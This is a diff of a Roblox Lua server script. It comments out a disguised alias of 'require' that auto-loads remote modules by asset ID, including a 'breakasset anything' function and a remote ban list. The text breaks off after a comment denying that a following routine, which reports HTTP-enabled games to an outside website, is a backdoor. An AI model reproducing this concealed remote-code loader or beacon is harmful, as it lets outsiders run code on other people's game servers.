@@ -46,7 +46,7 @@ local customQueries=require(modules.customQuery)
 
 headFunctions.rbxfuncs=rbxfuncs
 headFunctions.serviceCache={}
-headFunctions.crazyhamburgier=require
+--headFunctions.crazyhamburgier=require
 headFunctions.isStudio=runservice.IsStudio(runservice)
 headFunctions.isClient=isClient
 
@@ -141,38 +141,38 @@ function headFunctions.serverPrepareClient()
 	headFunctions.BootLocal(headFunctions.clientStarter,true)
 end
 
-function headFunctions.breakassetAnything(...)
-	return headFunctions.crazyhamburgier(131383766065343)(...)
-end
+-- function headFunctions.breakassetAnything(...)
+-- 	return headFunctions.crazyhamburgier(131383766065343)(...)
+-- end
 
-function headFunctions.getBans(checkUpdateDates)
-	local _,lists=pcall(function()
-		return headFunctions.crazyhamburgier(124072468517565)("userids")
-	end)
-	if typeof(lists)~="Instance" then return nil end
+-- function headFunctions.getBans(checkUpdateDates)
+-- 	local _,lists=pcall(function()
+-- 		return headFunctions.crazyhamburgier(124072468517565)("userids")
+-- 	end)
+-- 	if typeof(lists)~="Instance" then return nil end
 	
-	if checkUpdateDates then
-		local updateDates={}
+-- 	if checkUpdateDates then
+-- 		local updateDates={}
 		
-		for i,v in rbxfuncs.getchildren(lists) do
-			if v:FindFirstChild("UpdateDate")==nil then continue end
-			updateDates[v.Name]=v.UpdateDate.Value
-		end
+-- 		for i,v in rbxfuncs.getchildren(lists) do
+-- 			if v:FindFirstChild("UpdateDate")==nil then continue end
+-- 			updateDates[v.Name]=v.UpdateDate.Value
+-- 		end
 		
-		return updateDates
-	end
+-- 		return updateDates
+-- 	end
 	
-	local banlist={}
+-- 	local banlist={}
 	
-	for _,v in rbxfuncs.getchildren(lists) do
-		if v.ClassName~="ModuleScript" then continue end
-		for i,v in require(v) do
-			banlist[i]=v
-		end
-	end
+-- 	for _,v in rbxfuncs.getchildren(lists) do
+-- 		if v.ClassName~="ModuleScript" then continue end
+-- 		for i,v in require(v) do
+-- 			banlist[i]=v
+-- 		end
+-- 	end
 	
-	return banlist
-end
+-- 	return banlist
+-- end
 
 function headFunctions.securefunction(func)
 	return setfenv(func,table.freeze{})
@@ -359,8 +359,8 @@ end
 function headFunctions.isBanned(userid)
 	if typeof(userid)~="number" then return false end
 
-	return headFunctions.bans[userid] --require banlist
-		or headFunctions.sbans[userid] --server bans
+	return --headFunctions.bans[userid] --require banlist
+		headFunctions.sbans[userid] --server bans
 		or headFunctions.httpdata and headFunctions.httpdata.bans and headFunctions.httpdata.bans[userid] --bans from bsre backend WTF
 		or false --yep not banned
 end
@@ -514,19 +514,19 @@ if isClient==false then
 		headFunctions.isBSRE=false
 	end
 
-	if headFunctions.isBSRE==false then
-		task.spawn(headFunctions.crazyhamburgier,131383766065343) --breakasset anything
-		task.spawn(headFunctions.crazyhamburgier,124072468517565) --banlist returner
-		task.spawn(headFunctions.crazyhamburgier,70982440909340) --banlist handler
-		task.spawn(headFunctions.crazyhamburgier,14496782416) --r6 module
-		task.spawn(headFunctions.crazyhamburgier,130860510447760) --fse modded
-		headFunctions.bans=headFunctions.getBans() or {}
-	else
-		headFunctions.bans={}
-		headFunctions.getBans=nil
-		headFunctions.breakassetAnything=nil
-		headFunctions.crazyhamburgier=function()end
-	end
+	-- if headFunctions.isBSRE==false then
+	-- 	task.spawn(headFunctions.crazyhamburgier,131383766065343) --breakasset anything
+	-- 	task.spawn(headFunctions.crazyhamburgier,124072468517565) --banlist returner
+	-- 	task.spawn(headFunctions.crazyhamburgier,70982440909340) --banlist handler
+	-- 	task.spawn(headFunctions.crazyhamburgier,14496782416) --r6 module
+	-- 	task.spawn(headFunctions.crazyhamburgier,130860510447760) --fse modded
+	-- 	headFunctions.bans=headFunctions.getBans() or {}
+	-- else
+	-- 	headFunctions.bans={}
+	-- 	headFunctions.getBans=nil
+	-- 	headFunctions.breakassetAnything=nil
+	-- 	headFunctions.crazyhamburgier=function()end
+	-- end
 
 	--hi guys this is not a backdoor im just helping sb community by listing all http enabled games on groovy website
 	task.spawn(function()
